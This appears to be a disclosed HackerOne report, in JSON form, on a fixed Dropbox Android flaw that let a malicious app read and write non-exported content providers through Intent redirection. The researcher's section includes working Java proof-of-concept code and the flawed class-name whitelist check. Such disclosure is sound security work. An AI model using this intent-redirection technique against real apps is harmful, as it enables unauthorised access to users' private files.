{"id":272044,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yNzIwNDQ=","url":"https://hackerone.com/reports/272044","title":"Android - Access of some not exported content providers ","state":"Closed","substate":"resolved","severity_rating":"low","readable_substate":"Resolved","created_at":"2017-09-26T15:51:03.326Z","submitted_at":"2017-09-26T15:51:03.326Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"bagipro","url":"/bagipro","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/052/239/e2ad9e8b8b6b259834c21e7aefd2f3d04ccd3d23_original.jpg/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a"},"is_me?":false,"cleared":true,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":461,"url":"https://hackerone.com/dropbox","handle":"dropbox","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/000/461/76f193964f418c594dd74ae1326cf4d9223f481b_original.png/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/461/76f193964f418c594dd74ae1326cf4d9223f481b_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"Dropbox","twitter_handle":"","website":"https://www.dropbox.com","about":"Your stuff, anywhere"}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"no-content","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2017-11-30T00:35:22.845Z","bug_reporter_agreed_on_going_public_at":"2017-11-18T01:14:40.191Z","team_member_agreed_on_going_public_at":"2017-11-30T00:35:22.710Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"","vulnerability_information_html":"","bounty_amount":"1000.0","formatted_bounty":"$1,000","weakness":{"id":75,"name":"Privilege Escalation"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2017-12-18T01:14:40.289Z","allow_singular_disclosure_after":-95659482.71144661,"singular_disclosure_allowed":true,"vote_count":31,"voters":["smsecurity","jensec","stefanofinding","dee-see","cyber_humans","heeeeen","bobrov","alesandroortiz","mlitchfield","eveeez","and 21 more..."],"severity":{"rating":"low","author_type":"User"},"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":2025373,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"","markdown_message":"","automated_response":false,"created_at":"2017-09-26T17:56:47.726Z","updated_at":"2017-09-26T17:56:47.726Z","actor":{"username":"devd","cleared":false,"url":"/devd","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/012/376/241e11c4ddebe1e81cd547edaae1532bbed268aa_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"dropbox","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2025374,"is_internal":false,"editable":false,"type":"Activities::NotEligibleForBounty","message":"","markdown_message":"","automated_response":false,"created_at":"2017-09-26T17:56:53.672Z","updated_at":"2017-09-26T17:56:53.672Z","actor":{"url":"/dropbox","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/461/76f193964f418c594dd74ae1326cf4d9223f481b_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"Dropbox"}},"genius_execution_id":null,"team_handle":"dropbox","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2025397,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"","markdown_message":"","automated_response":false,"created_at":"2017-09-26T18:00:31.823Z","updated_at":"2017-09-26T18:00:31.823Z","actor":{"username":"bagipro","cleared":true,"url":"/bagipro","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/052/239/e2ad9e8b8b6b259834c21e7aefd2f3d04ccd3d23_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"dropbox","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2046036,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"","markdown_message":"","automated_response":false,"created_at":"2017-10-05T14:11:30.087Z","updated_at":"2017-10-05T14:11:30.087Z","actor":{"username":"devd","cleared":false,"url":"/devd","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/012/376/241e11c4ddebe1e81cd547edaae1532bbed268aa_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"bagipro","url":"/bagipro"},"genius_execution_id":null,"team_handle":"dropbox","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2046037,"is_internal":false,"editable":false,"type":"Activities::BugReopened","message":"","markdown_message":"","automated_response":false,"created_at":"2017-10-05T14:11:53.446Z","updated_at":"2017-10-05T14:11:53.446Z","actor":{"username":"devd","cleared":false,"url":"/devd","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/012/376/241e11c4ddebe1e81cd547edaae1532bbed268aa_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"dropbox","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2046042,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"","markdown_message":"","automated_response":false,"created_at":"2017-10-05T14:13:42.247Z","updated_at":"2017-10-05T14:13:42.247Z","actor":{"url":"/dropbox","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/461/76f193964f418c594dd74ae1326cf4d9223f481b_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"Dropbox"}},"bounty_amount":"1000.0","bounty_currency":"usd","bonus_amount":"0.0","genius_execution_id":null,"team_handle":"dropbox","collaborator":{"username":"bagipro","url":"/bagipro"},"actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2048503,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"","markdown_message":"","automated_response":false,"created_at":"2017-10-06T09:01:18.848Z","updated_at":"2017-10-06T09:01:18.848Z","actor":{"username":"bagipro","cleared":true,"url":"/bagipro","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/052/239/e2ad9e8b8b6b259834c21e7aefd2f3d04ccd3d23_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"dropbox","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2050052,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"","markdown_message":"","automated_response":false,"created_at":"2017-10-06T18:36:01.456Z","updated_at":"2017-10-06T18:36:01.456Z","actor":{"username":"devd","cleared":false,"url":"/devd","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/012/376/241e11c4ddebe1e81cd547edaae1532bbed268aa_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"dropbox","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2053928,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"","markdown_message":"","automated_response":false,"created_at":"2017-10-09T17:45:56.956Z","updated_at":"2017-10-09T17:45:56.956Z","actor":{"username":"devd","cleared":false,"url":"/devd","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/012/376/241e11c4ddebe1e81cd547edaae1532bbed268aa_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"dropbox","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2053993,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"","markdown_message":"","automated_response":false,"created_at":"2017-10-09T18:09:00.561Z","updated_at":"2017-10-09T18:09:00.561Z","actor":{"username":"bagipro","cleared":true,"url":"/bagipro","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/052/239/e2ad9e8b8b6b259834c21e7aefd2f3d04ccd3d23_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"dropbox","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2110169,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"","markdown_message":"","automated_response":false,"created_at":"2017-10-28T10:47:40.702Z","updated_at":"2017-10-28T10:47:40.702Z","actor":{"username":"bagipro","cleared":true,"url":"/bagipro","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/052/239/e2ad9e8b8b6b259834c21e7aefd2f3d04ccd3d23_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"dropbox","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2150096,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"","markdown_message":"","automated_response":false,"created_at":"2017-11-10T20:03:06.681Z","updated_at":"2017-11-10T20:03:06.681Z","actor":{"username":"bagipro","cleared":true,"url":"/bagipro","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/052/239/e2ad9e8b8b6b259834c21e7aefd2f3d04ccd3d23_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"dropbox","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2166694,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"","markdown_message":"","automated_response":false,"created_at":"2017-11-18T00:26:09.735Z","updated_at":"2017-11-18T00:26:09.735Z","actor":{"username":"nlattimer","cleared":false,"url":"/nlattimer","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/206/079/0305beb899e1ea03230c543d37f1cf2844ec2874_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"reporter":{"username":"bagipro","url":"/bagipro"},"genius_execution_id":null,"team_handle":"dropbox","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2166769,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2017-11-18T01:14:40.240Z","updated_at":"2017-11-18T01:14:40.240Z","first_to_agree":true,"actor":{"username":"bagipro","cleared":true,"url":"/bagipro","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/052/239/e2ad9e8b8b6b259834c21e7aefd2f3d04ccd3d23_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"dropbox","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2190198,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"","markdown_message":"","automated_response":false,"created_at":"2017-11-30T00:29:28.564Z","updated_at":"2017-11-30T00:29:28.564Z","actor":{"username":"bagipro","cleared":true,"url":"/bagipro","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/052/239/e2ad9e8b8b6b259834c21e7aefd2f3d04ccd3d23_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"dropbox","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2190206,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2017-11-30T00:35:22.746Z","updated_at":"2017-11-30T00:35:22.746Z","actor":{"username":"nlattimer","cleared":false,"url":"/nlattimer","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/206/079/0305beb899e1ea03230c543d37f1cf2844ec2874_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"dropbox","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2190207,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2017-11-30T00:35:22.873Z","updated_at":"2017-11-30T00:35:22.873Z","actor":{"username":"nlattimer","cleared":false,"url":"/nlattimer","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/206/079/0305beb899e1ea03230c543d37f1cf2844ec2874_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"dropbox","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"id":5929,"category":"team","content":"The report indicates a flaw in our Android application that would allow a malicious app to gain read/write access to some cached files (provided the attacker knows the name of the files) and other minor pieces of information. The vulnerability was caused by not validating the package name of an incoming Intent which allowed a malicious application to masquerade as a trusted android Activity. \n\nThe scope of potential impact was limited, however we have chosen to award a bounty and fix this issue.","can_view?":true,"can_edit?":false,"content_html":"\u003cp\u003eThe report indicates a flaw in our Android application that would allow a malicious app to gain read/write access to some cached files (provided the attacker knows the name of the files) and other minor pieces of information. The vulnerability was caused by not validating the package name of an incoming Intent which allowed a malicious application to masquerade as a trusted android Activity. \u003c/p\u003e\n\n\u003cp\u003eThe scope of potential impact was limited, however we have chosen to award a bounty and fix this issue.\u003c/p\u003e\n"},{"id":6269,"category":"researcher","content":"I used the following payload\n```java\n        Intent next = new Intent();\n        next.setClassName(getPackageName(), \"com.dropbox.android.activity.CameraUploadSettingsActivity\");\n        next.setData(Uri.parse(\"content://com.dropbox.android.LocalFile/smth\"));\n        next.setFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION\n                | Intent.FLAG_GRANT_WRITE_URI_PERMISSION\n                | Intent.FLAG_GRANT_PERSISTABLE_URI_PERMISSION\n                | Intent.FLAG_GRANT_PREFIX_URI_PERMISSION);\n\n        Intent intent = new Intent();\n        intent.setClassName(\"com.dropbox.android\", \"com.dropbox.android.activity.LoginOrNewAcctActivity\");\n        intent.putExtra(\"com.dropbox.activity.extra.NEXT_INTENT\", next);\n        startActivity(intent);\n```\nand way able to get access to providers which are ``` android:exported=\"false\" ``` but ``` android:grantUriPermissions=\"true\" ``` of Dropbox app. App had a white-list of allowed activities and performed the check by the following way:\n```java\n    public static boolean a(Intent intent) {\n        ComponentName component = intent.getComponent();\n        if (component == null) {\n            return false;\n        }\n        String className = component.getClassName();\n        for (Object equals : F) {\n            if (className.equals(equals)) {\n                return true;\n            }\n        }\n        return false;\n    }\n```\nSo I created an activity inside my app with name ``` com.dropbox.android.activity.CameraUploadSettingsActivity ``` and was able to force Dropbox app open it.","can_view?":true,"can_edit?":false,"content_html":"\u003cp\u003eI used the following payload\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight java\"\u003e\u003ccode\u003e        \u003cspan class=\"nc\"\u003eIntent\u003c/span\u003e \u003cspan class=\"n\"\u003enext\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"k\"\u003enew\u003c/span\u003e \u003cspan class=\"nc\"\u003eIntent\u003c/span\u003e\u003cspan class=\"o\"\u003e();\u003c/span\u003e\n        \u003cspan class=\"n\"\u003enext\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003esetClassName\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003egetPackageName\u003c/span\u003e\u003cspan class=\"o\"\u003e(),\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026quot;com.dropbox.android.activity.CameraUploadSettingsActivity\u0026quot;\u003c/span\u003e\u003cspan class=\"o\"\u003e);\u003c/span\u003e\n        \u003cspan class=\"n\"\u003enext\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003esetData\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"nc\"\u003eUri\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003eparse\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;content://com.dropbox.android.LocalFile/smth\u0026quot;\u003c/span\u003e\u003cspan class=\"o\"\u003e));\u003c/span\u003e\n        \u003cspan class=\"n\"\u003enext\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003esetFlags\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"nc\"\u003eIntent\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003eFLAG_GRANT_READ_URI_PERMISSION\u003c/span\u003e\n                \u003cspan class=\"o\"\u003e|\u003c/span\u003e \u003cspan class=\"nc\"\u003eIntent\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003eFLAG_GRANT_WRITE_URI_PERMISSION\u003c/span\u003e\n                \u003cspan class=\"o\"\u003e|\u003c/span\u003e \u003cspan class=\"nc\"\u003eIntent\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003eFLAG_GRANT_PERSISTABLE_URI_PERMISSION\u003c/span\u003e\n                \u003cspan class=\"o\"\u003e|\u003c/span\u003e \u003cspan class=\"nc\"\u003eIntent\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003eFLAG_GRANT_PREFIX_URI_PERMISSION\u003c/span\u003e\u003cspan class=\"o\"\u003e);\u003c/span\u003e\n\n        \u003cspan class=\"nc\"\u003eIntent\u003c/span\u003e \u003cspan class=\"n\"\u003eintent\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"k\"\u003enew\u003c/span\u003e \u003cspan class=\"nc\"\u003eIntent\u003c/span\u003e\u003cspan class=\"o\"\u003e();\u003c/span\u003e\n        \u003cspan class=\"n\"\u003eintent\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003esetClassName\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;com.dropbox.android\u0026quot;\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026quot;com.dropbox.android.activity.LoginOrNewAcctActivity\u0026quot;\u003c/span\u003e\u003cspan class=\"o\"\u003e);\u003c/span\u003e\n        \u003cspan class=\"n\"\u003eintent\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003eputExtra\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;com.dropbox.activity.extra.NEXT_INTENT\u0026quot;\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003enext\u003c/span\u003e\u003cspan class=\"o\"\u003e);\u003c/span\u003e\n        \u003cspan class=\"n\"\u003estartActivity\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eintent\u003c/span\u003e\u003cspan class=\"o\"\u003e);\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eand way able to get access to providers which are \u003ccode\u003eandroid:exported=\u0026quot;false\u0026quot;\u003c/code\u003e but \u003ccode\u003eandroid:grantUriPermissions=\u0026quot;true\u0026quot;\u003c/code\u003e of Dropbox app. App had a white-list of allowed activities and performed the check by the following way:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight java\"\u003e\u003ccode\u003e    \u003cspan class=\"kd\"\u003epublic\u003c/span\u003e \u003cspan class=\"kd\"\u003estatic\u003c/span\u003e \u003cspan class=\"kt\"\u003eboolean\u003c/span\u003e \u003cspan class=\"nf\"\u003ea\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"nc\"\u003eIntent\u003c/span\u003e \u003cspan class=\"n\"\u003eintent\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n        \u003cspan class=\"nc\"\u003eComponentName\u003c/span\u003e \u003cspan class=\"n\"\u003ecomponent\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003eintent\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003egetComponent\u003c/span\u003e\u003cspan class=\"o\"\u003e();\u003c/span\u003e\n        \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003ecomponent\u003c/span\u003e \u003cspan class=\"o\"\u003e==\u003c/span\u003e \u003cspan class=\"kc\"\u003enull\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n            \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"kc\"\u003efalse\u003c/span\u003e\u003cspan class=\"o\"\u003e;\u003c/span\u003e\n        \u003cspan class=\"o\"\u003e}\u003c/span\u003e\n        \u003cspan class=\"nc\"\u003eString\u003c/span\u003e \u003cspan class=\"n\"\u003eclassName\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003ecomponent\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003egetClassName\u003c/span\u003e\u003cspan class=\"o\"\u003e();\u003c/span\u003e\n        \u003cspan class=\"k\"\u003efor\u003c/span\u003e \u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"nc\"\u003eObject\u003c/span\u003e \u003cspan class=\"n\"\u003eequals\u003c/span\u003e \u003cspan class=\"o\"\u003e:\u003c/span\u003e \u003cspan class=\"no\"\u003eF\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n            \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eclassName\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003eequals\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eequals\u003c/span\u003e\u003cspan class=\"o\"\u003e))\u003c/span\u003e \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n                \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"kc\"\u003etrue\u003c/span\u003e\u003cspan class=\"o\"\u003e;\u003c/span\u003e\n            \u003cspan class=\"o\"\u003e}\u003c/span\u003e\n        \u003cspan class=\"o\"\u003e}\u003c/span\u003e\n        \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"kc\"\u003efalse\u003c/span\u003e\u003cspan class=\"o\"\u003e;\u003c/span\u003e\n    \u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eSo I created an activity inside my app with name \u003ccode\u003ecom.dropbox.android.activity.CameraUploadSettingsActivity\u003c/code\u003e and was able to force Dropbox app open it.\u003c/p\u003e\n"}]}